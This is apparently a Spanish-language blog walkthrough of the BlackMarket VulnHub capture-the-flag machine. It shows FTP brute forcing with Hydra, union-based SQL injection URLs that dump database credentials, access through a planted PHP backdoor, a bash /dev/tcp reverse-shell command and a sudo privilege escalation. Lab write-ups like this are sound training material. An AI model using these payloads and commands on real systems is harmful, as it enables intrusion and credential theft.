---
layout: single
title: BlackMarket - VulnHub
excerpt: " BlackMarket VM presented at Brisbane SecTalks BNE0x1B (28th Session) which is focused on students and other InfoSec Professional. This VM has total 6 flag and one r00t flag. Each Flag leads to another Flag and flag format is flag{blahblah}. Difficulty: Beginner/Intermediate "
date: 2023-02-09
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-blackmarket/blackmarket.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - SQLI
  - CTF
  - squirrelmail
  - Hydra
  - PHP
---

BlackMarket VM presented at Brisbane SecTalks BNE0x1B (28th Session) which is focused on students and other InfoSec Professional. This VM has total 6 flag and one r00t flag. Each Flag leads to another Flag and flag format is flag{blahblah}. **Difficulty: Beginner/Intermediate**

# Summary
- IP: 192.168.0.108
- Ports: 21,22,80,110,143,993,995
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	-  21 -> vsftpd 3.0.2
	-  22 -> OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7
	-  80 -> Apache httpd 2.4.7
	-  110 -> Dovecot pop3d
	-  143 -> Dovecot imapd
	-  993 -> ssl/imaps?
	-  995 -> ssl/pop3s?

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.0.107 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p21,22,80,110,143,993,995 -sCV 192.168.0.108 -oN targeted
```

- Escaneo de directorios con gobuster:

```bash
$gobuster dir -u 192.168.0.108 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```


# Análisis de página web:

- Analizamos el contenido de la página principal y nos topamos con un login, revisamos el código fuente y encontramos la flag 1 con un string en base64, lo decodeamos y vemos el siguiente mensaje:

```bash
$echo -n "Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=" | base64 -d; echo
```

```
CIA - Operation Treadstone
```


# Bruteforce puerto 21 (FTP) con Hydra:

- Buscamos en google "Operation Treadstone y encontramos un foro interesante https://bourne.fandom.com/wiki/Operation_Treadstone en el que podemos ver posibles nombres de usuario del sistema:

```
richard
ward
alexander
albert 
neil
nicky
daniel
```


- Guardamos los posibles usuarios en un archivo de texto "users.txt" y creamos un diccionario personalizado que contemple todas las palabras de dicho foro en un archivo de texto "passwords.txt"

```bash
$cewl https://bourne.fandom.com/wiki/Operation_Treadstone -w passwords.txt -d 0
```


- Hacemos un ataque de fuerza bruta con la información recolectada hasta ahora para ganar acceso por FTP:

```bash
$hydra -L /home/dante/Vulnhub/BlackMarket/content/users.txt -P /home/dante/Vulnhub/BlackMarket/content/passwords.txt ftp://192.168.0.108
```

```
[21][ftp] host: 192.168.0.108   login: nicky   password: CIA
```

- Obtenemos la contraseña para el usuario "nicky"; accedemos.

- Analizando el contenido de ftp, encontramos un archivo "IMP.txt", lo descargamos y lo abrimos:

```
flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy}

If anyone reading this message it means you are on the right track however I do not have any idea about the CIA blackmarket Vehical workshop. You must find out and hack it!
```

- Encontramos la flag2 y una posible pista, nos dice que tenemos que hackear una supuesta página de "Vehical Workshop", así que probamos en el enlace con palabras que contemplen esto y vemos que nos lleva a una página diferente con el siguiente enlace:

```
http://192.168.0.108/vworkshop/
```


# SQLI condicional:

- En la pestaña de "spare parts" podemos ver varios artículos enlistados, accedemos a cualquiera haciendo click en "more" y analizamos el link:

```
http://192.168.0.108/vworkshop/sparepartsstoremore.php?sparepartid=1
```

- En la parte de "sparepartid" está apuntando al artículo en cuestión, probamos con 3 y efectivamente nos muestra otro artículo. (con 2 no, lo cual es sospechosos)

- Deducimos que por detrás está haciendo una query que nos devuelve el artículo que le pedimos, para comprobar que es vulnerable a SQLI testeamos de la siguiente manera:

```
http://192.168.0.108/vworkshop/sparepartsstoremore.php?sparepartid=1' and sleep(5)-- -
```

- Como la página efectivamente hace un sleep de 5 segundos para recargar, podemos afirmar que existe vulerabilidad SQLI, seguimos testeando, en este caso, queremos comprobar cuantas columnas hay en la tabla usada, para esto, debemos validar con un mensaje de error que nos indique cuando la query no se ejecuta de forma correcta, en este caso, lo sabemos gracias a la imagen del artículo; cuando aparece, la query fluye correctamente, mientras que cuando no aparece, la query no se ejecuta de forma correcta:


```
http://192.168.0.108/vworkshop/sparepartsstoremore.php?sparepartid=1 order by 10-- -

http://192.168.0.108/vworkshop/sparepartsstoremore.php?sparepartid=1 order by 8-- -

http://192.168.0.108/vworkshop/sparepartsstoremore.php?sparepartid=1 order by 7-- -
```

- Al mostrarse la imagen en "order by 7" y no en "order by 8" podemos afirmar que existen 7 columnas de las cuales podemos aprovecharnos para mostrar información en pantalla; en este caso, extraeremos el nombre de las bases de datos existentes, cambiando el "id=1" por otro en el que no se nos muestre información de un artículo existente para que nos muestre la información que necesitemos:

```
http://192.168.0.108/vworkshop/sparepartsstoremore.php?sparepartid=-1' union select 1,2,3,group_concat(schema_name),5,6,7 from information_schema.schemata-- -
```

- Obtenemos las bases de datos existentes:

```
Cost : information_schema,BlackMarket,eworkshop,mysql,performance_schema
```

- Analizaremos la base de datos "BlackMarket"; primero enumeramos las tablas:

```
http://192.168.0.108/vworkshop/sparepartsstoremore.php?sparepartid=-1' union select 1,2,3,group_concat(table_name),5,6,7 from information_schema.tables where table_schema='BlackMarket'-- -
```

- Obtenemos la tablas:

```
Cost : cart,category,customer,flag,inventory,product,sales,sales_detail,supplier,user
```

- Analizamos las columnas que hay en la tabla "user":

```
http://192.168.0.108/vworkshop/sparepartsstoremore.php?sparepartid=-1' union select 1,2,3,group_concat(column_name),5,6,7 from information_schema.columns where table_schema='BlackMarket' and table_name='user'-- -
```

- Obtenemos las columnas de la tabla "user" de la BD "BlackMarket":

```
Cost : userid,username,password,access
```

- Ahora, extraemos la información de las columnas "username" y "password":

```
http://192.168.0.108/vworkshop/sparepartsstoremore.php?sparepartid=-1' union select 1,2,3,group_concat(username,":",password),5,6,7 from BlackMarket.user-- -
```

- Obtenemos la siguiente información:

```
Cost : admin:cf18233438b9e88937ea0176f1311885,user:0d8d5cd06832b29560745fe4e1b941cf,supplier:99b0e8da24e29e4ccb5d7d76e677c2ac,jbourne:28267a2e06e312aee91324e2fe8ef1fd,bladen :cbb8d2a0335c793532f9ad516987a41c
```

- Guardamos estos hashes y los intentamos desencriptar en hashes.com:

- Obtenemos las contraseñas para "admin", "supplier" y "user".

- En el primer login que encontramos (web raíz) intentamos acceder con estas credenciales como "admin":

- Nos salta una ventana emergente con la flag4 y un mensaje:

```
Login Success, Welcome BigBOSS! here is your flag4{bm90aGluZyBpcyBoZXJl} Jason Bourne Email access ?????
```

- Vemos una posible credencial "?????" para el usuario de email "Jason Bourne"; en la fase de reconocimiento habíamos encontrado un directorio "/squirrelmail" accedemos e intentamos entrar con el nombre de usuario "jbourne" que podemos observar en la página a la que habíamos accedido como admin:

- Habiendo accedido como "jbourne" en "squirrelmail", nos dirigimos a la pestaña de "Draft_imbox" y vemos un mensaje y la flag5:

```
Flag5{RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=}

HELLO Friend,

I have intercept the message from Russian's some how we are working on the same
direction, however, I couldn't able to decode the message. 

<Message Begins> 


Sr Wrnrgir
Ru blf ziv ivzwrmt gsrh R nrtsg yv mlg zorev. R szev kozxv z yzxpwlli rm Yozxpnzipvg
dliphslk fmwvi /ptyyzxpwlli ulowvi blf nfhg szev gl fhv
KzhhKzhh.qkt rm liwvi gl tvg zxxvhh.

</end>
```

- Vemos un posible mensaje encriptado, lo intentamos descrifrar en https://quipqiup.com/ y obtenemos el siguiente mensaje:

```
Hi Dimitri If you are reading this I might be not alive. I have place a backdoor in Blackmarket workshop under /kgbbackdoor folder you must have to use PassPass.jpg in order to get access.
```

- Nos dice que existe un backdoor en el directorio "/kgbackdoor" y que podemos ganar acceso de alguna forma con el archivo "PassPass.jpg"

- Nos dirigimos al directorio mencionado "/kgbackdoor" y apuntamos al archivo "PassPass.jpg"

```
http://192.168.0.108/vworkshop/kgbbackdoor/PassPass.jpg
```

- Lo descargamos y lo analizamos con "strings":

```bash
$wget http://192.168.0.108/vworkshop/kgbbackdoor/PassPass.jpg
$strings PassPass.jpg
```

- Encontramos un password en números decimales, lo transformamos en hexadecimal y luego a texto plano en https://www.rapidtables.com/convert/number/decimal-to-hex.html para encontrar lo siguiente.

```
HailKGB
```

- Ahora hacemos una búsqueda de archivos en el directorio "/kgbackdoor":

```bash
$gobuster dir -u http://192.168.0.108/vworkshop/kgbbackdoor/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100 -x php
```

- Encontramos un archivo "backdoor.php", accedemos a este y se nos muestra una pequeña entrada de input en el que debemos ingresar la contraseña encontrada en el archivo jpg.

- Nos despliega una ventana con varias opciones y tendremos la posibilidad de ejecutar comandos.

- En la opción "Execute" ejecutamos el comando para entablarnos una reverse shell y ganar acceso al sistema:

```
bash -c "bash -i >& /dev/tcp/192.168.0.107/443 0>&1"
```


# ESCALANDO PRIVILEGIOS:

- En el directorio home hacemos un "ls -la" para mostrar ficheros ocultos y vemos un directorio ".Mylife" entramos.

- Mostramos ficheros ocultos de nuevo y encontramos un ".Secret", cateamos el archivo y vemos el siguiente mensaje:

```
I have been working on this CIA BlackMarket Project but it seems like I am not doing anything 
right for people. Selling drugs and guns is not my business so soon I will quit the job. 

About my personal life I am a sharp shooter have two kids but my wife don't like me and I am broke. Food wise I eat everything but DimitryHateApple

I will add more about later! 
```

- Podemos ver una posible credencial para el usuario enumerado "dimitri", solo que está mal escrito el nombre "DimitryHateApple", lo corregimos "DimitriHateApple" y pivotamos al usuario "dimitri".

- Como "dimitri" vemos permisos de sudoers (sudo -l) y vemos lo siguiente:

```
Matching Defaults entries for dimitri on Dimitri:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dimitri may run the following commands on Dimitri:
    (ALL : ALL) ALL
```

- Simplemente hacemos un "sudo su", ponemos la contraseña de dimitri y seremos root.
